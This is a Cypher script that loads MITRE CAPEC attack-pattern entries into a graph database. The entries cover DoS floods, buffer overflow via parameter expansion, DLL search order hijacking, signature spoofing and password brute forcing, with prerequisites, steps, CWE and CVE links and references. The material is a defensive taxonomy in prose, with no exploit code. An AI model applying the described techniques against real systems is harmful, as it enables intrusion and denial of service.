CREATE (:ResourcesRequired{id: 224, text: "<div level=\"0\">\n  <p class=\"text\">Attacker controlled site / page to render a page referencing the injected CSS string</p>\n</div>"});
CREATE (:AttackPattern{id: 469, name: "HTTP DoS", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 331, text: "<div level=\"0\">\n  <p class=\"text\">HTTP protocol is used</p>\n  <p class=\"text\">Web server used is vulnerable to denial of service via HTTP flooding</p>\n</div>"});
CREATE (:Submission{id: 414});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 408, summary: "OrderedDict([('Text', ['An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP.', \"The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.\"])])"});
MERGE (:Reference{local_id: "R.469.1", author: "Robert Hansen", title: "Slowris HTTP DoS", pubdate: "June 17, 2009", link: "http://ha.ckers.org/blog/20090617/slowloris-http-dos/"});
MERGE (:CWE{id: 770});
MERGE (:CWE{id: 772});
CREATE (:ResourcesRequired{id: 225, text: "<div level=\"0\">\n  <p class=\"text\">Ability to issues hundreds of HTTP requests</p>\n</div>"});
CREATE (:AttackPattern{id: 47, name: "Buffer Overflow via Parameter Expansion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 332, text: "<div level=\"0\">\n  <p class=\"text\">The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 333, text: "<div level=\"0\">\n  <p class=\"text\">The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).</p>\n</div>"});
CREATE (:Submission{id: 415});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 286});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 287});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 288});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Modification{id: 289});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Phases"});
CREATE (:Description{id: 409, summary: "OrderedDict([('Text', 'In this attack, the target software is given input that the attacker knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Consider parts of the program where user supplied data may be expanded by the program. Use a disassembler and other reverse engineering tools to guide the search.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Find a place where a buffer overflow occurs due to the fact that the new expanded size of the string is not correctly accounted for by the program. This may happen perhaps when the string is copied to another buffer that is big enough to hold the original, but not the expanded string. This may create an opportunity for planting the payload and redirecting program execution to the shell code.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Write the buffer overflow exploit. To be exploitable, the \"spill over\" amount (e.g. the difference between the expanded string length and the original string length before it was expanded) needs to be sufficient to allow the overflow of the stack return pointer (in the case of a stack overflow), without causing a stack corruption that would crash the program before it gets to execute the shell code. Heap overflow will be more difficult and will require the attacker to get more lucky, by perhaps getting a chance to overwrite some of the accounting information stored as part of using malloc().</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.47.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 130});
MERGE (:CWE{id: 131});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 697});
CREATE (:ResourcesRequired{id: 226, text: "<div level=\"0\">\n  <p class=\"text\">Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.</p>\n</div>"});
CREATE (:AttackPattern{id: 470, name: "Expanding Control over the Operating System from the Database", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 334, text: "<div level=\"0\">\n  <p class=\"text\">A vulnerable DBMS is used</p>\n  <p class=\"text\">A SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means</p>\n</div>"});
CREATE (:Submission{id: 416});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 410, summary: "OrderedDict([('Text', ['An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine.', 'Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks.', 'These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.'])])"});
MERGE (:Reference{local_id: "R.470.1", author: "Bernardo Damele Assump ção Guimarães", title: "Advanced SQL Injection to Operating System Full Control", pubdate: "April 10, 2009", link: "http://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf"});
MERGE (:CWE{id: 250});
MERGE (:CWE{id: 89});
CREATE (:AttackPattern{id: 471, name: "DLL Search Order Hijacking", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 335, text: "<div level=\"0\">\n  <p class=\"text\">Windows system is used</p>\n  <p class=\"text\">Attacker has a mechanism to place its malicious DLLs in the needed location on the file system</p>\n</div>"});
CREATE (:Submission{id: 417});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 290});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 411, summary: "OrderedDict([('Text', [\"The attacker exploits the functionality of the Windows DLL loader where the process loading the DLL searches for the DLL to be loaded first in the same directory in which the process binary resides and then in other directories (e.g., System32). Exploitation of this preferential search order can allow an attacker to make the loading process load the attackers' rogue DLL rather than the legitimate DLL.\", \"For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\\\\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\\\\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.\", \"This attack can be leveraged with many different DLLs and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect DLL had been loaded.\"])])"});
MERGE (:Reference{local_id: "R.471.1", title: "M Trends Report", publisher: "Mandiant", pubdate: "2011", link: "www.mandiant.com"});
MERGE (:Reference{local_id: "R.471.2", author: "ATT&CK Project", title: "DLL search order hijacking (1038)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/DLL_search_order_hijacking"});
MERGE (:CWE{id: 427});
MERGE (:CWE{id: 706});
CREATE (:AttackPattern{id: 472, name: "Browser Fingerprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 336, text: "<div level=\"0\">\n  <p class=\"text\">Victim's browser visits a website that contains attacker's Java Script</p>\n  <p class=\"text\">Java Script is not disabled in the victim's browser</p>\n</div>"});
CREATE (:Submission{id: 418});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 412, summary: "OrderedDict([('Text', 'An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.')])"});
MERGE (:Reference{local_id: "R.472.1", author: "Gareth Heyes", title: "Detecting browsers javascript hacks", pubdate: "January 29, 2009", link: "http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/"});
MERGE (:CWE{id: 200});
CREATE (:AttackPattern{id: 473, name: "Signature Spoof", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 337, text: "<div level=\"0\">\n  <p class=\"text\">The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 338, text: "<div level=\"0\">\n  <p class=\"text\">The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.</p>\n</div>"});
CREATE (:Submission{id: 419});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 413, summary: "OrderedDict([('Text', 'An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.')])"});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 327});
MERGE (:CWE{id: 290});
CREATE (:AttackPattern{id: 474, name: "Signature Spoofing by Key Theft", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 339, text: "<div level=\"0\">\n  <p class=\"text\">An authoritative or reputable signer is storing their private signature key with insufficient protection.</p>\n</div>"});
CREATE (:Submission{id: 420});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 414, summary: "OrderedDict([('Text', \"An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\")])"});
MERGE (:CWE{id: 284});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 216});
CREATE (:AttackPattern{id: 475, name: "Signature Spoofing by Improper Validation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 340, text: "<div level=\"0\">\n  <p class=\"text\">Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.</p>\n</div>"});
CREATE (:Submission{id: 421});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 291});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 415, summary: "OrderedDict([('Text', 'An attacker exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.')])"});
CREATE (:CVE{id: "CVE-2006-4339", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
MERGE (:CWE{id: 693});
CREATE (:AttackPattern{id: 476, name: "Signature Spoofing by Misrepresentation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 341, text: "<div level=\"0\">\n  <p class=\"text\">Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.</p>\n  <p class=\"text\">Recipient is using signature verification software that contains a parsing vulnerability, or allows control characters in the signer identity field, such that a signature is mistakenly displayed as valid and from a known or authoritative signer.</p>\n</div>"});
CREATE (:Submission{id: 422});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 416, summary: "OrderedDict([('Text', \"An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.\")])"});
CREATE (:AttackPattern{id: 477, name: "Signature Spoofing by Mixing Signed and Unsigned Content", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 342, text: "<div level=\"0\">\n  <p class=\"text\">Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 343, text: "<div level=\"0\">\n  <p class=\"text\">Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.</p>\n</div>"});
CREATE (:Submission{id: 423});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 417, summary: "OrderedDict([('Text', 'An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.')])"});
CREATE (:CVE{id: "CVE-2007-1263", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
CREATE (:CVE{id: "CVE-2010-3618", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
CREATE (:CVE{id: "CVE-2012-6359", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 311});
MERGE (:CWE{id: 319});
CREATE (:AttackPattern{id: 48, name: "Passing Local Filenames to Functions That Expect a URL", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 344, text: "<div level=\"0\">\n  <p class=\"text\">The victim's software must not differentiate between the location and type of reference passed the client software, e.g. browser</p>\n</div>"});
CREATE (:Submission{id: 424});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 292});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 418, summary: "OrderedDict([('Text', \"This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.\")])"});
MERGE (:Reference{id: "REF-2", local_id: "R.48.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 241});
MERGE (:CWE{id: 706});
CREATE (:AttackPattern{id: 482, name: "TCP Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 345, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.</p>\n</div>"});
CREATE (:Submission{id: 425});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 419, summary: "OrderedDict([('Text', 'An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain.')])"});
CREATE (:AttackPattern{id: 484, name: "XML Client-Side Attack", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 346, text: "<div level=\"0\">\n  <p class=\"text\">An application uses an XML parser to perform transformation on user-controllable data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 347, text: "<div level=\"0\">\n  <p class=\"text\">An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</p>\n</div>"});
CREATE (:Submission{id: 426});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 420, summary: "OrderedDict([('Text', \"Client applications such as web browsers that process HTML data often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc. An attacker's goal is to leverage parser failure to his or her advantage. In some cases it may be possible to jump from the data plane to the control plane via bad data being passed to an XML parser. [R.484.1]\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker determines the input data stream that is being processed by an XML parser on the victim's side.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</p>\n</div>"});
MERGE (:Reference{id: "REF-43", local_id: "R.484.1", author: "Shlomo, Yona", title: "XML Parser Attacks: A summary of ways to attack an XML Parser", section: "What is an XML Parser Attack?", pubdate: "2007", link: "http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html"});
MERGE (:Reference{id: "REF-44", local_id: "R.484.2", title: "Microsoft Security Bulletin MS13-002", section: "Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution", publisher: "Microsoft", pubdate: "January 8, 2013", link: "http://technet.microsoft.com/en-us/security/bulletin/ms13-002"});
MERGE (:CWE{id: 112});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 19});
CREATE (:AttackPattern{id: 485, name: "Signature Spoofing by Key Recreation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 348, text: "<div level=\"0\">\n  <p class=\"text\">An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 349, text: "<div level=\"0\">\n  <p class=\"text\">An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.</p>\n</div>"});
CREATE (:Submission{id: 427});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 421, summary: "OrderedDict([('Text', \"An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\")])"});
CREATE (:CVE{id: "CVE-2008-0166", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-3108", description: "<div level=\"0\">\n  <p class=\"text\">Targeted</p>\n</div>"});
MERGE (:CWE{id: 330});
MERGE (:CWE{id: 310});
CREATE (:AttackPattern{id: 486, name: "UDP Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 350, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.</p>\n</div>"});
CREATE (:Submission{id: 428});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 422, summary: "OrderedDict([('Text', 'An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.')])"});
CREATE (:AttackPattern{id: 487, name: "ICMP Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 351, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.</p>\n</div>"});
CREATE (:Submission{id: 429});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 423, summary: "OrderedDict([('Text', 'An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.')])"});
CREATE (:AttackPattern{id: 488, name: "HTTP Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 352, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.</p>\n</div>"});
CREATE (:Submission{id: 430});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 424, summary: "OrderedDict([('Text', \"An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.\")])"});
CREATE (:AttackPattern{id: 489, name: "SSL Flood", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 353, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.</p>\n</div>"});
CREATE (:Submission{id: 431});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 425, summary: "OrderedDict([('Text', 'An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.')])"});
CREATE (:AttackPattern{id: 49, name: "Password Brute Forcing", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 354, text: "<div level=\"0\">\n  <p class=\"text\">An attacker needs to know a username to target.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 355, text: "<div level=\"0\">\n  <p class=\"text\">The system uses password based authentication as the one factor authentication mechanism.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 356, text: "<div level=\"0\">\n  <p class=\"text\">An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.</p>\n</div>"});
CREATE (:Submission{id: 432});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 426, summary: "OrderedDict([('Text', ['In this attack, the attacker tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.', 'A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy.', 'In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.).'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine application's/system's password policy", description: "<div level=\"0\">\n  <p class=\"text\">Determine the password policies of the target application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine minimum and maximum allowed password lengths.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are used in the application/system</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are not used for authentication; however, brute forcing of other protection mechanisms may also be possible.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Brute force password", description: "<div level=\"0\">\n  <p class=\"text\">Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Perform an offline dictionary attack or a rainbow table attack against a known password hash.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Weak passwords allowed, and no account lockout policy enforced.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Password hashes can be captured by attacker.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Accounts locked out after small number of failed authentication attempts.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker determines correct password for a user ID and obtains access to application or system."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker is unable to determine correct password for a user ID and obtain access to application or system."});
CREATE (:Outcome{id: 3, type: "Failure", description: "Attacker locks out account while attempting to brute force its password."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Corrective"});
MERGE (:CWE{id: 521});
MERGE (:CWE{id: 262});
MERGE (:CWE{id: 263});
MERGE (:CWE{id: 257});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 228, text: "<div level=\"0\">\n  <p class=\"text\">A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).</p>\n</div>"});
CREATE (:AttackPattern{id: 490, name: "Amplification", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 357, text: "<div level=\"0\">\n  <p class=\"text\">This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.</p>\n</div>"});
CREATE (:Submission{id: 433});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 293});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 427, summary: "OrderedDict([('Text', 'An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.')])"});
